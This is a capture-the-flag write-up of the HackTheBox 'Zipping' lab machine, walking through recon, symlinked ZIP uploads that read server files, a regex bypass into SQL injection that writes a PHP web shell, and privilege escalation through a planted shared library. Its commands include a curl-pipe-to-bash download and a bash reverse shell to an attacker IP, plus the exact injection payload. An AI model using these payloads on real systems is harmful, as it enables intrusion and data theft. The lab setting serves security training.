# HackTheBox Zipping

A Medium-level HackTheBox platform lab machine running Linux containing LFI vulnerability using ZIP archives, regex bypass, SQL injection, and binary reversal to find creds and using a dynamic library for privilege escalation.

## Services overview

The machine has been assigned IP-address 10.10.11.229. Let's check what's going on the ports in the standard way:

```shell
$ rustscan --ulimit=5000 --range=1-65535 -a 10.10.11.229 -- -A -sC

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.0p1 Ubuntu 1ubuntu7.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 9d6eec022d0f6a3860c6aaac1ee0c284 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBP6mSkoF2+wARZhzEmi4RDFkpQx3gdzfggbgeI5qtcIseo7h1mcxH8UCPmw8Gx9+JsOjcNPBpHtp2deNZBzgKcA=
|   256 eb9511c7a6faad74aba2c5f6a4021841 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOXXd7dM7wgVC+lrF0+ZIxKZlKdFhG2Caa9Uft/kLXDa
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.54 ((Ubuntu))
|_http-server-header: Apache/2.4.54 (Ubuntu)
|_http-title: Zipping | Watch store
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.93%E=4%D=11/21%OT=22%CT=%CU=35489%PV=Y%DS=2%DC=T%G=N%TM=655C78FE%P=x86_64-pc-linux-gnu)
SEQ(SP=103%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)
OPS(O1=M54EST11NW7%O2=M54EST11NW7%O3=M54ENNT11NW7%O4=M54EST11NW7%O5=M54EST11NW7%O6=M54EST11)
WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54ENNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)
```

Standard 80 and 22 ports for Linux machines in HackTheBox.

## Web interface

Let's see what you can do on the web interface.

```shell
$ gobuster dir -t 128 -k -u 10.10.11.229 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,sh,cgi

/uploads              (Status: 301) [Size: 314] [--> http://10.10.11.229/uploads/]
/shop                 (Status: 301) [Size: 311] [--> http://10.10.11.229/shop/]
/index.php            (Status: 200) [Size: 16738]
/assets               (Status: 301) [Size: 313] [--> http://10.10.11.229/assets/]
/upload.php           (Status: 200) [Size: 5322]
```

Of interest are the links to /upload.php and /shop/.

We can upload a ZIP archive containing a single PDF file to the form.

```text
File successfully uploaded and unzipped, a staff member will review your resume as soon as possible. Make sure it has been uploaded correctly by accessing the following path:
uploads/ea2ecdb7fcff24d8f74c9c0697b16d86/1.pdf
```

Let's use the technique with symbolic link creation:

```shell
$ ln -s /etc/passwd test.pdf
$ zip --symlinks test.zip test.pdf
```

Let's upload the resulting test.zip file into the form.

```text
File successfully uploaded and unzipped, a staff member will review your resume as soon as possible. Make sure it has been uploaded correctly by accessing the following path:
uploads/96ca6705d73ce48c74d7cce3f3e5d889/test.pdf
```

Download result and let's see::

```text
http://10.10.11.229//uploads/96ca6705d73ce48c74d7cce3f3e5d889/test.pdf
```

```shell
$ cat test.pdf
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:104:110:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
rektsu:x:1001:1001::/home/rektsu:/bin/bash
mysql:x:107:115:MySQL Server,,,:/nonexistent:/bin/false
_laurel:x:999:999::/var/log/laurel:/bin/false
```

Let's look at the /var/www/html/shop/index.php file:

```shell
$ rm -rf test.pdf test.zip && ln -s /var/www/html/shop/index.php test.pdf && zip --symlinks test.zip test.pdf
```

Let's upload the file according to the previous scheme and download the result:

```shell
$ cat test.pdf

<?php
session_start();
// Include functions and connect to the database using PDO MySQL
include 'functions.php';
$pdo = pdo_connect_mysql();
// Page is set to home (home.php) by default, so when the visitor visits, that will be the page they see.
$page = isset($_GET['page']) && file_exists($_GET['page'] . '.php') ? $_GET['page'] : 'home';
// Include and show the requested page
include $page . '.php';
?>
```

Let's do the same with the /var/www/html/shop/functions.php file:

```shell
$ rm -rf test.pdf test.zip && ln -s /var/www/html/shop/functions.php test.pdf && zip --symlinks test.zip test.pdf
```

Let's upload the file according to the previous scheme and download the result:

```shell
$ cat test.pdf

<?php
function pdo_connect_mysql() {
    // Update the details below with your MySQL details
    $DATABASE_HOST = 'localhost';
    $DATABASE_USER = 'root';
    $DATABASE_PASS = 'MySQL_P@ssw0rd!';
    $DATABASE_NAME = 'zipping';
    try {
        return new PDO('mysql:host=' . $DATABASE_HOST . ';dbname=' . $DATABASE_NAME . ';charset=utf8', $DATABASE_USER, $DATABASE_PASS);
    } catch (PDOException $exception) {
        // If there is an error with the connection, stop the script and display the error.
        exit('Failed to connect to database!');
    }
}
// Template header, feel free to customize this
function template_header($title) {
$num_items_in_cart = isset($_SESSION['cart']) ? count($_SESSION['cart']) : 0;
echo <<<EOT
<!DOCTYPE html>
<html>
        <head>
                <meta charset="utf-8">
                <title>$title</title>
                <link href="assets/style.css" rel="stylesheet" type="text/css">
                <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css">
        </head>
        <body>
        <header>
            <div class="content-wrapper">
                <a href=".." style="text-decoration: none;"><h1>Zipping Watch Store</h1></a>
                <nav>
                    <a href="index.php">Home</a>
                    <a href="index.php?page=products">Products</a>
                </nav>
                <div class="link-icons">
                    <a href="index.php?page=cart">
                                                <i class="fas fa-shopping-cart"></i>
                                                <span>$num_items_in_cart</span>
                                        </a>
                </div>
            </div>
        </header>
        <main>
EOT;
}
// Template footer
function template_footer() {
$year = date('Y');
echo <<<EOT
        </main>
        <footer>
            <div class="content-wrapper">
                <p>&copy; $year, Zipping Watch Store</p>
            </div>
        </footer>
    </body>
</html>
EOT;
}
?>
```

Let's do the same with the /var/www/html/shop/product.php file:

```shell
$ rm -rf test.pdf test.zip && ln -s /var/www/html/shop/product.php test.pdf && zip --symlinks test.zip test.pdf
```

Let's upload the file according to the previous scheme and download the result:

```shell
$ cat test.pdf
<?php
// Check to make sure the id parameter is specified in the URL
if (isset($_GET['id'])) {
    $id = $_GET['id'];
    // Filtering user input for letters or special characters
    if(preg_match("/^.*[A-Za-z!#$%^&*()\-_=+{}\[\]\\|;:'\",.<>\/?]|[^0-9]$/", $id, $match)) {
        header('Location: index.php');
    } else {
        // Prepare statement and execute, but does not prevent SQL injection
        $stmt = $pdo->prepare("SELECT * FROM products WHERE id = '$id'");
        $stmt->execute();
        // Fetch the product from the database and return the result as an Array
        $product = $stmt->fetch(PDO::FETCH_ASSOC);
        // Check if the product exists (array is not empty)
        if (!$product) {
            // Simple error to display if the id for the product doesn't exists (array is empty)
            exit('Product does not exist!');
        }
    }
} else {
    // Simple error to display if the id wasn't specified
    exit('No ID provided!');
}
?>

<?=template_header('Zipping | Product')?>

<div class="product content-wrapper">
    <img src="assets/imgs/<?=$product['img']?>" width="500" height="500" alt="<?=$product['name']?>">
    <div>
        <h1 class="name"><?=$product['name']?></h1>
        <span class="price">
            &dollar;<?=$product['price']?>
            <?php if ($product['rrp'] > 0): ?>
            <span class="rrp">&dollar;<?=$product['rrp']?></span>
            <?php endif; ?>
        </span>
        <form action="index.php?page=cart" method="post">
            <input type="number" name="quantity" value="1" min="1" max="<?=$product['quantity']?>" placeholder="Quantity" required>
            <input type="hidden" name="product_id" value="<?=$product['id']?>">
            <input type="submit" value="Add To Cart">
        </form>
        <div class="description">
            <?=$product['desc']?>
        </div>
    </div>
</div>

<?=template_footer()?>
```

As you can see, we need to bypass the regexp to accomplish SQL-Injection (// Prepare statement and execute, but does not prevent SQL injection). They will have to be bypassed in two steps:

- `^.*[A-Za-z!#$%^&*()\-_=+{}\[\]\\|;:'\",.<>\/?]` - only checks the first line, so we can bypass it with %x0A (newline character).
- `[^0-9]$/` - checks if the string ends with a number, so we bypass with %231 (#1).

First generate the shell file, then start the Python server and catch the shell.

```shell
$ echo "bash -c 'bash -i >& /dev/tcp/10.10.16.28/4444 0>&1'" > rev.sh
$ python3 -m http.server 8081
$ nc -lvnp 4444
```

Now let's trigger our shell:

```shell
$ curl -s $'http://10.10.11.229/shop/index.php?page=product&id=%0A\'%3bselect+\'<%3fphp+system(\"curl+http%3a//10.10.16.28:8081/rev.sh|bash\")%3b%3f>\'+into+outfile+\'/var/lib/mysql/breached.php\'+%231'
Product does not exist!

$ curl -s $'http://10.10.11.229/shop/index.php?page=..%2f..%2f..%2f..%2f..%2fvar%2flib%2fmysql%2fbreached'
```

Catch the shell in `nc`:

```shell
$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.16.28] from (UNKNOWN) [10.10.11.229] 39474
bash: cannot set terminal process group (1146): Inappropriate ioctl for device
bash: no job control in this shell
rektsu@zipping:/var/www/html/shop$ id
id
uid=1001(rektsu) gid=1001(rektsu) groups=1001(rektsu)
rektsu@zipping:/var/www/html/shop$ cd /home/rektsu
cd /home/rektsu
rektsu@zipping:/home/rektsu$ ls
ls
user.txt
rektsu@zipping:/home/rektsu$ cat user.txt
cat user.txt
34f2c1b81920d55d86e8cebeadce1c46
rektsu@zipping:/home/rektsu$
```

## Privilege escalation

Let's see what we can do with superuser privileges:

```shell
$ sudo -l
sudo -l
Matching Defaults entries for rektsu on zipping:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User rektsu may run the following commands on zipping:
    (ALL) NOPASSWD: /usr/bin/stock
```

Run the `strings` command to see if the password can be displayed:

```shell
$ strings /usr/bin/stock
strings /usr/bin/stock
/lib64/ld-linux-x86-64.so.2
mgUa
fgets
stdin
puts
exit
fopen
__libc_start_main
fprintf
dlopen
__isoc99_fscanf
__cxa_finalize
strchr
fclose
__isoc99_scanf
strcmp
__errno_location
libc.so.6
GLIBC_2.7
GLIBC_2.2.5
GLIBC_2.34
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
PTE1
u+UH
Hakaize
St0ckM4nager
/root/.stock.csv
Enter the password:
Invalid password, please try again.
================== Menu ==================
1) See the stock
2) Edit the stock
3) Exit the program
Select an option:
You do not have permissions to read the file
File could not be opened.
================== Stock Actual ==================
Colour     Black   Gold    Silver
Amount     %-7d %-7d %-7d
Quality   Excelent Average Poor
Amount    %-9d %-7d %-4d
Exclusive Yes    No
Amount    %-4d   %-4d
Warranty  Yes    No
================== Edit Stock ==================
Enter the information of the watch you wish to update:
Colour (0: black, 1: gold, 2: silver):
Quality (0: excelent, 1: average, 2: poor):
Exclusivity (0: yes, 1: no):
Warranty (0: yes, 1: no):
Amount:
Error: The information entered is incorrect
%d,%d,%d,%d,%d,%d,%d,%d,%d,%d
The stock has been updated correctly.
;*3$"
GCC: (Debian 12.2.0-3) 12.2.0
Scrt1.o
__abi_tag
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
stock.c
__FRAME_END__
_DYNAMIC
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_start_main@GLIBC_2.34
__errno_location@GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__isoc99_fscanf@GLIBC_2.7
puts@GLIBC_2.2.5
stdin@GLIBC_2.2.5
_edata
fclose@GLIBC_2.2.5
_fini
strchr@GLIBC_2.2.5
fgets@GLIBC_2.2.5
__data_start
strcmp@GLIBC_2.2.5
dlopen@GLIBC_2.34
fprintf@GLIBC_2.2.5
__gmon_start__
__dso_handle
_IO_stdin_used
checkAuth
_end
__bss_start
main
fopen@GLIBC_2.2.5
__isoc99_scanf@GLIBC_2.7
exit@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@GLIBC_2.2.5
_init
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got.plt
.data
.bss
.comment
```

Password: St0ckM4nager

If the correct password is entered, the executable is used to view and modify the inventory located in /root/.stock.csv and then use `strace` to analyze the standard file:

```shell
$ strace /usr/bin/stock
execve("/usr/bin/stock", ["/usr/bin/stock"], 0x7ffd3b4c4250 /* 15 vars */) = 0
brk(NULL)                               = 0x55f9853e7000
arch_prctl(0x3001 /* ARCH_??? */, 0x7ffc648962c0) = -1 EINVAL (Invalid argument)
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f19aed59000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=18225, ...}, AT_EMPTY_PATH) = 0
mmap(NULL, 18225, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f19aed54000
close(3)                                = 0
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\3206\2\0\0\0\0\0"..., 832) = 832
pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=2072888, ...}, AT_EMPTY_PATH) = 0
pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
mmap(NULL, 2117488, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f19aea00000
mmap(0x7f19aea22000, 1544192, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x22000) = 0x7f19aea22000
mmap(0x7f19aeb9b000, 356352, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x19b000) = 0x7f19aeb9b000
mmap(0x7f19aebf2000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1f1000) = 0x7f19aebf2000
mmap(0x7f19aebf8000, 53104, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f19aebf8000
close(3)                                = 0
mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f19aed51000
arch_prctl(ARCH_SET_FS, 0x7f19aed51740) = 0
set_tid_address(0x7f19aed51a10)         = 1758
set_robust_list(0x7f19aed51a20, 24)     = 0
rseq(0x7f19aed52060, 0x20, 0, 0x53053053) = 0
mprotect(0x7f19aebf2000, 16384, PROT_READ) = 0
mprotect(0x55f984988000, 4096, PROT_READ) = 0
mprotect(0x7f19aed8f000, 8192, PROT_READ) = 0
prlimit64(0, RLIMIT_STACK, NULL, {rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
munmap(0x7f19aed54000, 18225)           = 0
newfstatat(1, "", {st_mode=S_IFSOCK|0777, st_size=0, ...}, AT_EMPTY_PATH) = 0
getrandom("\x52\x0a\xce\x81\x90\x31\x28\xe7", 8, GRND_NONBLOCK) = 8
brk(NULL)                               = 0x55f9853e7000
brk(0x55f985408000)                     = 0x55f985408000
newfstatat(0, "", {st_mode=S_IFSOCK|0777, st_size=0, ...}, AT_EMPTY_PATH) = 0
read(0, St0ckM4nager
"St0ckM4nager\n", 4096)         = 13
openat(AT_FDCWD, "/home/rektsu/.config/libcounter.so", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
```

The above shows that `openat(AT_FDCWD, "/home/rektsu/.config/libcounter.so", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)` is being called. We have access to the path /home/rektsu/.config/, and we can create a malicious `libcounter.so` file and place it there. Create our own exploit `lib.c`:

```c
#include <unistd.h>

void begin (void) __attribute__((destructor));
void begin (void) {
    system("bash -p");
}
```

```shell
$ gcc -shared -fPIC -nostartfiles -o libcounter.so lib.c
$ python3 -m http.server 8081
```

```shell
rektsu@zipping:/var/www/html/shop$ cd /home/rektsu/.config
rektsu@zipping:/home/rektsu/.config$ wget http://10.10.16.28:8081/libcounter.so
rektsu@zipping:/home/rektsu/.config$ sudo -l
User rektsu may run the following commands on zipping:
    (ALL) NOPASSWD: /usr/bin/stock
rektsu@zipping:/home/rektsu/.config$ sudo /usr/bin/stock
sudo /usr/bin/stock
St0ckM4nager
3
Enter the password:
================== Menu ==================

1) See the stock
2) Edit the stock
3) Exit the program

Select an option: rektsu@zipping:/home/rektsu/.config$ bash -p
bash -p
id
uid=1001(rektsu) gid=1001(rektsu) euid=0(root) groups=1001(rektsu)
cd /root
ls
root.txt
cat root.txt
c48d65e0aec8798b0884c13e70182e9d
```
